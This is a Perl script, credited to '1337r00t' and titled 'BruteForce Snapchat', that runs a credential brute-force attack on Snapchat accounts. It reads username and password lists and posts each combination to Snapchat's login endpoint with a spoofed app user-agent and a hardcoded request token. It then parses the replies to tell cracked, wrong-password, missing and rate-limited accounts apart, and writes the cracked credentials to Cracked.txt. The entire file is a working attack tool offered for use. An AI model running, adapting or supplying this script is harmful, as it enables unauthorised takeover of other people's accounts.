##########################################
use LWP::UserAgent; # ppm install LWP::UserAgent
##########################################
system('clear');
system('cls');
system('color 5');
print qq(
################################
#      BruteForce Snapchat     #
################################
#     Coded By 1337r00t        #
################################
#                              #
#   Instagram : 1337r00t       #
#                              #
#    Twitter : _1337r00t       #
#                              #
################################
Enter [CTRL+C] For Exit :0\n);
print qq(
Enter Usernames File :
> );
$usernames=<STDIN>;
chomp($usernames);
open (USERFILE, "<$usernames") || die "[-] Can't Found ($usernames) !";
@USERS = <USERFILE>;
close USERFILE;
print qq(
Enter Passwords File :
> );
$passwords=<STDIN>;
chomp($passwords);
open (PASSFILE, "<$passwords") || die "[-] Can't Found ($passwords) !";
@PASSS = <PASSFILE>;
close PASSFILE;
system('clear');
system('cls');
print '
    _   _____  _____   _____    ____    ___       ___     _____   
   /"| |___"/u|___"/u |___ "|U |  _"\ u/ _"\  u  / _"\  u|_ " _|  
 u | |uU_|_ \/U_|_ \/    / /  \| |_) |/ / U |/  | / U |/   | |    
  \| |/ ___) | ___) | u// /\   |  _ < | \// |,-.| \// |,-./| |\   
   |_| |____/ |____/   /_/ U   |_| \_\ \___/(_/  \___/(_/u |_|U   
 _//<,-,_// \\ _// \\ <<>>_    //   \\_ //        //     _// \\_  
(__)(_/(__)(__|__)(__|__)__)  (__)  (__|__)      (__)   (__) (__) 
';
print "\nUsernames: ($usernames)\nPasswords: ($passwords)\n--------\nCracking Now !..\n";
######################
foreach $username (@USERS) {
chomp $username;
	foreach $password (@PASSS) {
	chomp $password;
		$snapchat = LWP::UserAgent->new();
		$snapchat->default_header('Accept-Language' => "en;q=0.9");
		$snapchat->default_header('User-Agent' => "Snapchat/8.2.0 (SM-G900F; Android 5.0#G900FXXS1BPCL#21; gzip)");
		$response = $snapchat->post('https://app.snapchat.com/loq/login',
			{ 
			password => $password,
			req_token => '9300a1585ce1b2f86e0903e7f0a890046eed4d8119e34a8709b4c614d9c5165b',
			timestamp => '1506271406216',
			username => $username
			}
			);
		if ($response->content=~ /using a version of Snapchat or operating system/) {
			print "Cracked -> ($username:$password)\n";
			open(R0T,">>Cracked.txt");
			print R0T "\n($username:$password)\n";
			close(R0T);
		}
		else
		{
			if ($response->content=~ /not the right password./) {
				print "Failed -> ($username:$password)\n";
			}
			else
			{
				if ($response->content=~ /find an account with that username./) {
					print "NotFound -> ($username)\n";
				}
				else
				{
					if ($response->content=~ /Invalid account/) {
						print "Invalid account -> ($username)\n";
					}
					else
					{
						if ($response->content=~ /Due to repeated failed login attempts or other suspicious activity/) {
							print "Block bruting only this user -> ($username)\n";
						}
						else
						{
							print "Blocked Your IP for Requests\n";
						}
					}
				}
			}
		}
	}
}
